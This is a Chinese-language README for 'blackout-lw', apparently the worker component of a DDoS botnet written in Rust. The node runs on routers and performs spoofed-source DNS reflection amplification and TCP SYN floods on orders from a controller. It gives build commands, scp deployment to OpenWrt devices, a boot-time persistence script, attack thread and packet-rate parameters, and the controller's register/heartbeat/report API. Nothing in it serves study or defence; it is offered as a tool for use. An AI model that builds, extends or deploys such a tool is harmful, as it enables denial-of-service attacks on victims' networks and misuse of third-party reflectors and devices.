# blackout-lw — Blackout 轻量伪造 Worker（Rust）

路由器 / 低性能设备的伪源攻击节点。单二进制，scp 即跑，掉线就掉线（靠量取胜）。

## 定位

- **只做**两件事（均由 Controller 决定派发顺序）：
  1. **DNS 反射放大**（伪源 UDP 查询 → 反射器大响应打到受害者）— 优先
  2. **伪源 TCP SYN 洪水**（raw socket 构造 SYN，随机伪源 IP/端口/序列号，堆积目标半开连接）— 无反射任务可派时回退
- **不做**：直连 L4/L7（HTTP/2、TLS 等）、challenge 两段式、热池、自更新（v1）
- **平台**：x86_64 / armv7 / aarch64 / mipsel（OpenWrt 路由器、软路由、树莓派）
- **协议**：HTTP/1.1 + JSON 轮询直连 Controller 源站（明文，心跳 = 任务轮询）
- **体积目标**：release + strip 后 < 600KB
- **权限**：DNS/TCP 伪源均需 root（raw socket + IP_HDRINCL）

> 两种方法都需要 raw socket：非 root 运行时任务会因 `raw socket failed (need root?)` 全部计入错误包，
> 任务时长照常走完并在结束时上报（不会卡住 Controller 的任务队列）。

## 编译

```bash
# 本机（调试）
cargo build

# 交叉编译（安装对应 target 后）
rustup target add x86_64-unknown-linux-musl armv7-unknown-linux-musleabihf \
    aarch64-unknown-linux-musl mipsel-unknown-linux-musl
cargo build --release --target x86_64-unknown-linux-musl
# 需要对应平台的 musl 链接器（Linux 下可用 musl-cross / zigbuild）
```

## 部署（路由器）

```bash
# 1. 拷贝二进制（OpenWrt）
scp target/<platform>/release/blackout-lw root@router:/usr/bin/
chmod +x /usr/bin/blackout-lw

# 2. 手动运行（前台验证）
blackout-lw -c <controller-ip>:10240 -t <worker-token> -threads 8 -pps 200000

# 3. 开机自启（procd）
cat > /etc/init.d/blackout-lw <<'EOF'
#!/bin/sh /etc/rc.common
START=99
start() {
    blackout-lw -c <controller-ip>:10240 -t <worker-token> -pps 200000 &
}
EOF
chmod +x /etc/init.d/blackout-lw
/etc/init.d/blackout-lw enable
```

> 需要 root（raw socket）。固件升级会清掉二进制——掉线就掉线，重新部署即可。

## 参数

| 参数 | 说明 |
|---|---|
| `-c host:port` | Controller HTTP 地址（必填） |
| `-t token` | worker token（必填） |
| `-threads N` | 攻击线程数（默认 8，上限 256） |
| `-pps N` | **整机** PPS 上限（按线程均分，0 = 不限，默认 0） |

## 与 Controller 的接口

| 端点 | 方法 | 说明 |
|---|---|---|
| `/api/lw/register` | POST | 注册（token/platform/arch）→ node_id |
| `/api/lw/heartbeat` | POST | 心跳 + 任务轮询 + 踢出检查 |
| `/api/lw/report` | POST | 统计上报 |
| `/api/reflectors/all?pool=dns` | GET | 反射器池（复用） |

## 模块

```
src/
├── main.rs       入口：参数解析 → 伪造自检 → 心跳循环
├── config.rs     配置（命令行参数）
├── http.rs       迷你 HTTP/1.1 客户端（零 TLS 依赖）
├── heartbeat.rs  注册/心跳轮询/任务执行（dns_reflector / tcp_syn）/上报
├── spoof.rs      raw socket 伪源 UDP + 伪源 TCP SYN（IP_HDRINCL + 校验和）
├── dns.rs        DNS TXT 查询构造
├── reflector.rs  池拉取与条目解析
├── attack.rs     攻击循环（DNS 反射 / TCP SYN，多线程 + 原子统计）
└── throttle.rs   PPS 节流 + /proc/loadavg 负载自适应降速
```
